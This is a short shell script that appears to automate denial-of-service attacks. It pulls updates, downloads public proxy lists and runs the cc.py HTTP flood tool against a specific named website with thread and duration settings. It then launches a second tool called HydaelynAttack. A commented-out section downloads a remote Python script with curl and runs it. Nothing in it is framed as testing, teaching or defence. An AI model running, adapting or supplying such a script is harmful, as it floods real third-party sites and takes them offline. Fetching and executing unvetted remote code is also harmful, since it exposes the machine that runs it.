cd ~/Nyaa-Automata
git pull

echo ""
echo "CC-attack"
cd CC-attack
git pull
curl https://jsd.cdn.zzko.cn/gh/TheSpeedX/PROXY-List@master/http.txt -o http.txt
curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o http.txt
python3 cc.py -url http://fwecc.top/ -f http.txt -v 5 -s 30
cd ..

echo ""
echo "HydaelynAttack"
cd HydaelynAttack
git pull
python3 HydaelynAttack_p_once_noLog.py
cd ..

#echo ""
#echo "overload"
#cd overload
#git pull
#curl https://jsd.cdn.zzko.cn/gh/NyaaCaster/Nyaa-Automata@main/overload_p.py -o overload_p.py
#curl https://nyaacaster.github.io/Nyaa-Automata@main/overload_p.py -o overload_p.py
#python3 overload_p.py
#cd ..
#
